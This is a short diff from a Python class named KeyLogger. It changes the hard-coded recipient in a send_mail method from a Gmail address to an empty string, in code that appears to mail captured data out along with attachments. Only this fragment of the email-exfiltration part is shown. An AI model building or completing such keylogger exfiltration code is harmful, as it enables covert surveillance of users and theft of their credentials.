@@ -63,7 +63,7 @@ class KeyLogger:
 
     def send_mail(self, email, password, subject, body, attachments=None):
         sender = email
-        receiver = "studiesvit@gmail.com"
+        receiver = ""
 
         msg = MIMEMultipart()
         msg['From'] = sender
